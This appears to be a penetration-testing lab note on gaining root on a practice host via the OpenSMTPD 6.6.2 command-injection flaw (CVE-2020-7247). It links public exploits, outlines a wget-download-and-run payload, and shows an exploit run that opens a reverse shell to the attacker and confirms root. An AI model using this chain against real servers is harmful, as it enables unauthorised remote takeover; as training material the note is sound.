# 4 :25 opensmtpd 6.6.2

```
# OpenSMTPD 6.6.2
# msfvenom elf shell > wget > chmod > invoke
https://www.exploit-db.com/raw/47984

[OR]
Using https://github.com/QTranspose/CVE-2020-7247-exploit

$ python3 exploit.py 192.168.197.71 25 192.168.49.197 445 root
[+] Opening connection to 192.168.197.71 on port 25: Done
[+] Target port is running OpenSMTPD
[+] Sending love letter to root: Done
[*] Closed connection to 192.168.197.71 port 25
[+] Trying to bind to 192.168.49.197 on port 445: Done
[+] Waiting for connections on 192.168.49.197:445: Got connection from 192.168.197.71 on port 34344
[*] Switching to interactive mode
bash: cannot set terminal process group (2248): Inappropriate ioctl for device
bash: no job control in this shell

root@bratarina:~# $ whoami;id;hostname;uname -a
whoami;id;hostname;uname -a
root
uid=0(root) gid=0(root) groups=0(root)
bratarina
Linux bratarina 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
